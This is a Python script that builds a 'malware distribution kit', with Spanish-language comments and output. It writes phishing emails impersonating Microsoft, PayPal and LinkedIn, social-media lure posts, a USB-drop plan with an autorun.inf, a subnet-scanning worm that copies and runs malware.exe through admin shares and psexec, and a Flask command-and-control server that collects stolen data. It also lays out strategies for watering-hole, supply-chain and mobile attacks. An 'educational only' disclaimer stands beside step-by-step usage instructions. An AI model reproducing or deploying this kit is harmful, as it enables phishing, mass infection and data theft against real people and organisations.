#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Malware Distribution Strategy
⚠️ WARNING: This is for educational purposes only!
"""

import os
import sys
import time
import json
import shutil
import socket
import threading
import subprocess
import smtplib
import requests
import zipfile
import base64
import random
import string
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import winreg
import tempfile
from pathlib import Path

class MalwareDistribution:
    def __init__(self):
        self.target_emails = []
        self.social_media_accounts = []
        self.usb_devices = []
        self.network_targets = []
        self.c2_server = "http://attacker-server.com"
        
    def create_distribution_plan(self):
        """Create comprehensive distribution strategy"""
        print("🎯 Creando plan de distribución...")
        
        # 1. Social Engineering Campaigns
        self.create_email_campaigns()
        self.create_social_media_campaigns()
        
        # 2. Physical Distribution
        self.create_usb_drops()
        
        # 3. Network Propagation
        self.create_network_worms()
        self.create_watering_holes()
        
        # 4. Supply Chain Attacks
        self.create_supply_chain_attacks()
        
        # 5. Mobile Distribution
        self.create_mobile_payloads()
        
        print("✅ Plan de distribución creado")
    
    def create_email_campaigns(self):
        """Create phishing email campaigns"""
        print("📧 Creando campañas de phishing...")
        
        email_templates = [
            {
                "subject": "Actualización de Seguridad Urgente - Microsoft",
                "body": """
Estimado usuario,

Microsoft ha detectado una vulnerabilidad crítica en su sistema. 
Por favor, ejecute el archivo adjunto para aplicar la actualización de seguridad.

Este es un mensaje automático, no responda a este correo.

Microsoft Security Team
                """,
                "attachment": "security_update.exe"
            },
            {
                "subject": "Factura Pendiente - PayPal",
                "body": """
Su cuenta de PayPal tiene una factura pendiente de pago.
Por favor, revise el documento adjunto y complete el pago.

Si no realiza el pago en 24 horas, su cuenta será suspendida.

PayPal Security
                """,
                "attachment": "invoice.pdf.exe"
            },
            {
                "subject": "Oferta de Trabajo - LinkedIn",
                "body": """
¡Felicitaciones! Ha sido seleccionado para una posición de trabajo remoto.
Por favor, complete el formulario adjunto para proceder.

Salario: $5,000 USD mensuales
Trabajo remoto desde casa

Recursos Humanos
                """,
                "attachment": "job_application.exe"
            }
        ]
        
        # Create email templates
        for i, template in enumerate(email_templates):
            with open(f"email_template_{i+1}.txt", 'w', encoding='utf-8') as f:
                f.write(f"Subject: {template['subject']}\n\n")
                f.write(template['body'])
                f.write(f"\n\nAttachment: {template['attachment']}")
        
        print("✅ Plantillas de email creadas")
    
    def create_social_media_campaigns(self):
        """Create social media distribution campaigns"""
        print("📱 Creando campañas de redes sociales...")
        
        social_posts = [
            "¡Descarga gratis el nuevo juego que todos están jugando! 🎮 Link en bio #gaming",
            "Actualización de WhatsApp disponible - descarga ahora para nuevas funciones 📱",
            "Oferta limitada: Software de edición profesional GRATIS por tiempo limitado 🎬",
            "Nuevo filtro de Instagram - descarga la app para acceder 🔥",
            "Crypto trading bot que genera $1000/día - descarga gratis 💰"
        ]
        
        # Create social media templates
        with open("social_media_posts.txt", 'w', encoding='utf-8') as f:
            for post in social_posts:
                f.write(f"{post}\n\n")
        
        print("✅ Posts de redes sociales creados")
    
    def create_usb_drops(self):
        """Create USB drop strategy"""
        print("💾 Creando estrategia de USB drops...")
        
        usb_strategy = {
            "locations": [
                "Estacionamientos de empresas",
                "Universidades y colegios",
                "Cafeterías y restaurantes",
                "Aeropuertos y estaciones",
                "Oficinas gubernamentales"
            ],
            "file_names": [
                "CONFIDENTIAL_SALARIES.xlsx",
                "COMPANY_PASSWORDS.txt",
                "PRIVATE_PHOTOS.zip",
                "TAX_RETURN_2024.pdf",
                "BANK_STATEMENTS.xlsx"
            ],
            "autorun_script": """
[autorun]
open=malware.exe
icon=malware.exe
label=USB Drive
action=Open folder to view files
"""
        }
        
        # Create USB strategy file
        with open("usb_drop_strategy.json", 'w') as f:
            json.dump(usb_strategy, f, indent=2)
        
        # Create autorun.inf
        with open("autorun.inf", 'w') as f:
            f.write(usb_strategy["autorun_script"])
        
        print("✅ Estrategia de USB drops creada")
    
    def create_network_worms(self):
        """Create network propagation worms"""
        print("🕷️ Creando gusanos de red...")
        
        worm_code = '''
import os
import socket
import threading
import subprocess
import shutil

class NetworkWorm:
    def __init__(self):
        self.target_ports = [21, 22, 23, 80, 135, 139, 443, 445, 3389]
        self.vulnerabilities = {
            "eternal_blue": "MS17-010",
            "blue_keep": "CVE-2019-0708",
            "smbghost": "CVE-2020-0796"
        }
    
    def scan_and_infect(self):
        """Scan network and attempt to infect"""
        local_ip = socket.gethostbyname(socket.gethostname())
        network = '.'.join(local_ip.split('.')[:-1])
        
        for i in range(1, 255):
            target_ip = f"{network}.{i}"
            threading.Thread(target=self.attempt_infection, args=(target_ip,)).start()
    
    def attempt_infection(self, target_ip):
        """Attempt to infect target"""
        try:
            # Try SMB exploitation
            if self.exploit_smb(target_ip):
                self.copy_malware(target_ip)
            
            # Try RDP exploitation
            elif self.exploit_rdp(target_ip):
                self.copy_malware(target_ip)
                
        except Exception as e:
            pass
    
    def exploit_smb(self, target_ip):
        """Exploit SMB vulnerabilities"""
        # Implementation would use actual exploit code
        return False
    
    def exploit_rdp(self, target_ip):
        """Exploit RDP vulnerabilities"""
        # Implementation would use actual exploit code
        return False
    
    def copy_malware(self, target_ip):
        """Copy malware to target"""
        try:
            # Copy via network share
            subprocess.run([
                "copy", "malware.exe", f"\\\\{target_ip}\\C$\\Windows\\Temp\\"
            ], capture_output=True)
            
            # Execute remotely
            subprocess.run([
                "psexec", f"\\\\{target_ip}", "-c", "malware.exe"
            ], capture_output=True)
            
        except Exception as e:
            pass
'''
        
        with open("network_worm.py", 'w') as f:
            f.write(worm_code)
        
        print("✅ Gusano de red creado")
    
    def create_watering_holes(self):
        """Create watering hole attacks"""
        print("🏞️ Creando ataques de watering hole...")
        
        watering_hole_strategy = {
            "target_websites": [
                "Sitios web de noticias populares",
                "Foros de tecnología",
                "Sitios de descarga de software",
                "Redes sociales",
                "Sitios de empleo"
            ],
            "injection_methods": [
                "SQL injection para insertar código malicioso",
                "XSS para redirigir a sitios maliciosos",
                "Compromiso de CDN para servir malware",
                "Inyección de anuncios maliciosos",
                "Compromiso de plugins de WordPress"
            ],
            "payload_delivery": [
                "Drive-by downloads",
                "Fake software updates",
                "Malicious advertisements",
                "Social engineering popups"
            ]
        }
        
        with open("watering_hole_strategy.json", 'w') as f:
            json.dump(watering_hole_strategy, f, indent=2)
        
        print("✅ Estrategia de watering hole creada")
    
    def create_supply_chain_attacks(self):
        """Create supply chain attack strategies"""
        print("🔗 Creando ataques de cadena de suministro...")
        
        supply_chain_strategy = {
            "targets": [
                "Desarrolladores de software",
                "Proveedores de servicios en la nube",
                "Fabricantes de hardware",
                "Proveedores de actualizaciones",
                "Repositorios de código"
            ],
            "methods": [
                "Compromiso de repositorios Git",
                "Inyección de código en actualizaciones",
                "Compromiso de certificados de código",
                "Ataques a CI/CD pipelines",
                "Compromiso de dependencias"
            ],
            "payloads": [
                "Backdoors en actualizaciones legítimas",
                "Malware en software popular",
                "Rootkits en drivers de hardware",
                "Spyware en aplicaciones móviles"
            ]
        }
        
        with open("supply_chain_strategy.json", 'w') as f:
            json.dump(supply_chain_strategy, f, indent=2)
        
        print("✅ Estrategia de cadena de suministro creada")
    
    def create_mobile_payloads(self):
        """Create mobile distribution payloads"""
        print("📱 Creando payloads móviles...")
        
        mobile_strategy = {
            "android_payloads": [
                "Fake banking apps",
                "Malicious games",
                "Fake security apps",
                "Pornographic apps",
                "Fake cryptocurrency wallets"
            ],
            "ios_payloads": [
                "Jailbreak exploits",
                "Enterprise app abuse",
                "TestFlight abuse",
                "Sideloading exploits"
            ],
            "distribution_methods": [
                "Third-party app stores",
                "Social media links",
                "QR codes",
                "SMS phishing",
                "Email attachments"
            ]
        }
        
        with open("mobile_strategy.json", 'w') as f:
            json.dump(mobile_strategy, f, indent=2)
        
        print("✅ Estrategia móvil creada")
    
    def create_obfuscated_payload(self):
        """Create obfuscated malware payload"""
        print("🔒 Creando payload ofuscado...")
        
        # Read original malware
        with open("app.py", 'r') as f:
            original_code = f.read()
        
        # Simple obfuscation techniques
        obfuscated_code = self.obfuscate_code(original_code)
        
        # Create multiple variants
        variants = [
            "security_update.py",
            "system_optimizer.py", 
            "antivirus_scanner.py",
            "windows_fix.py",
            "driver_update.py"
        ]
        
        for variant in variants:
            with open(variant, 'w') as f:
                f.write(obfuscated_code)
        
        print("✅ Payloads ofuscados creados")
    
    def obfuscate_code(self, code):
        """Simple code obfuscation"""
        # Base64 encode strings
        import base64
        
        # Replace common strings with encoded versions
        replacements = {
            "import": base64.b64encode(b"import").decode(),
            "def": base64.b64encode(b"def").decode(),
            "class": base64.b64encode(b"class").decode(),
            "print": base64.b64encode(b"print").decode()
        }
        
        obfuscated = code
        for original, encoded in replacements.items():
            obfuscated = obfuscated.replace(original, f"exec(base64.b64decode('{encoded}').decode())")
        
        return obfuscated
    
    def create_c2_server(self):
        """Create command and control server"""
        print("🖥️ Creando servidor C2...")
        
        c2_server_code = '''
from flask import Flask, request, jsonify
import json
import os
import threading
import time

app = Flask(__name__)

# Store infected machines
infected_machines = {}

@app.route('/register', methods=['POST'])
def register_machine():
    """Register new infected machine"""
    data = request.json
    machine_id = data.get('machine_id')
    ip_address = request.remote_addr
    
    infected_machines[machine_id] = {
        'ip': ip_address,
        'last_seen': time.time(),
        'status': 'active',
        'data': []
    }
    
    return jsonify({'status': 'registered'})

@app.route('/command/<machine_id>', methods=['GET'])
def get_command(machine_id):
    """Get command for specific machine"""
    if machine_id in infected_machines:
        # Return command based on machine status
        return jsonify({
            'command': 'steal_data',
            'parameters': {}
        })
    return jsonify({'command': 'none'})

@app.route('/data/<machine_id>', methods=['POST'])
def receive_data(machine_id):
    """Receive stolen data from machine"""
    if machine_id in infected_machines:
        data = request.json
        infected_machines[machine_id]['data'].append(data)
        return jsonify({'status': 'received'})
    return jsonify({'status': 'error'})

@app.route('/status')
def get_status():
    """Get status of all infected machines"""
    return jsonify(infected_machines)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
'''
        
        with open("c2_server.py", 'w') as f:
            f.write(c2_server_code)
        
        print("✅ Servidor C2 creado")
    
    def create_distribution_kit(self):
        """Create complete distribution kit"""
        print("📦 Creando kit de distribución...")
        
        # Create distribution folder
        dist_folder = "malware_distribution_kit"
        os.makedirs(dist_folder, exist_ok=True)
        
        # Copy all files
        files_to_copy = [
            "app.py",
            "email_template_1.txt",
            "email_template_2.txt", 
            "email_template_3.txt",
            "social_media_posts.txt",
            "usb_drop_strategy.json",
            "autorun.inf",
            "network_worm.py",
            "watering_hole_strategy.json",
            "supply_chain_strategy.json",
            "mobile_strategy.json",
            "c2_server.py"
        ]
        
        for file in files_to_copy:
            if os.path.exists(file):
                shutil.copy2(file, dist_folder)
        
        # Create README
        readme_content = """
# Malware Distribution Kit

## ⚠️ ADVERTENCIA
Este kit es únicamente para fines educativos y de investigación en seguridad.
NO debe ser usado para actividades maliciosas.

## Contenido del Kit:

### 1. Malware Principal
- app.py: Malware principal con todas las funcionalidades

### 2. Campañas de Email
- email_template_*.txt: Plantillas de phishing por email

### 3. Redes Sociales
- social_media_posts.txt: Posts para distribución en redes sociales

### 4. Distribución Física
- usb_drop_strategy.json: Estrategia de USB drops
- autorun.inf: Archivo de auto-ejecución para USB

### 5. Propagación de Red
- network_worm.py: Gusano para propagación en red

### 6. Ataques de Watering Hole
- watering_hole_strategy.json: Estrategia de sitios comprometidos

### 7. Cadena de Suministro
- supply_chain_strategy.json: Ataques a la cadena de suministro

### 8. Distribución Móvil
- mobile_strategy.json: Estrategias para dispositivos móviles

### 9. Servidor C2
- c2_server.py: Servidor de comando y control

## Instrucciones de Uso:

1. Configurar servidor C2
2. Personalizar plantillas de email
3. Crear payloads ofuscados
4. Ejecutar campañas de distribución
5. Monitorear infecciones

## Consideraciones Legales:
- Solo usar en entornos controlados
- Obtener permisos explícitos
- Cumplir con todas las leyes locales
- Usar únicamente para investigación ética
        """
        
        with open(os.path.join(dist_folder, "README.md"), 'w', encoding='utf-8') as f:
            f.write(readme_content)
        
        # Create zip file
        shutil.make_archive("malware_distribution_kit", 'zip', dist_folder)
        
        print("✅ Kit de distribución creado: malware_distribution_kit.zip")

def main():
    """Main execution function"""
    print("=" * 60)
    print("🎯 MALWARE DISTRIBUTION STRATEGY CREATOR 🎯")
    print("=" * 60)
    
    distributor = MalwareDistribution()
    
    try:
        distributor.create_distribution_plan()
        distributor.create_obfuscated_payload()
        distributor.create_c2_server()
        distributor.create_distribution_kit()
        
        print("\n" + "=" * 60)
        print("✅ ESTRATEGIA DE DISTRIBUCIÓN COMPLETADA")
        print("=" * 60)
        print("\nArchivos creados:")
        print("- Kit de distribución: malware_distribution_kit.zip")
        print("- Servidor C2: c2_server.py")
        print("- Payloads ofuscados: security_update.py, etc.")
        print("- Estrategias de distribución: *.json")
        print("- Plantillas de phishing: email_template_*.txt")
        
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
